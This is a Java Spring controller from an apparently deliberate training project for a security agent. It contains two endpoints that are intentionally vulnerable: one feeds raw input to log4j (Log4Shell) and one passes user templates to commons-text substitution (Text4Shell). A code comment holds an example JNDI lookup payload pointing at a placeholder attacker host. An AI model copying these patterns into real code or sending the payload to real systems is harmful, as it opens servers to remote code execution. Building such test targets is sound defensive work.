package com.example.workshop.order;

import org.apache.commons.text.StringSubstitutor;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.util.Map;

/**
 * REST endpoints for the Order Processor.
 *
 * <p>These handlers intentionally demonstrate the vulnerable dependencies so
 * the Security Agent has both dependency findings and reachable code paths to
 * reason about.
 */
@RestController
public class OrderController {

    // Log4Shell: logging attacker-controlled input on a vulnerable log4j-core
    // version allows JNDI lookups such as ${jndi:ldap://attacker/x}.
    private static final Logger LOGGER = LogManager.getLogger(OrderController.class);

    @GetMapping("/health")
    public String health() {
        return "OK";
    }

    /**
     * Echoes a note back to the caller.
     *
     * <p>VULNERABLE (CVE-2021-44228): user input is passed straight to the
     * logger, which on log4j-core 2.14.1 evaluates ${...} lookups.
     */
    @GetMapping("/orders/note")
    public String note(@RequestParam("value") String value) {
        LOGGER.info("Received order note: " + value);
        return "logged";
    }

    /**
     * "Renders" a templated label for an order.
     *
     * <p>VULNERABLE (CVE-2022-42889 / Text4Shell): commons-text 1.9 resolves
     * ${script:...}, ${dns:...}, and ${url:...} prefixes during substitution.
     */
    @GetMapping("/orders/label")
    public String label(@RequestParam("template") String template) {
        StringSubstitutor substitutor = new StringSubstitutor(Map.of("orderId", "12345"));
        return substitutor.replace(template);
    }
}
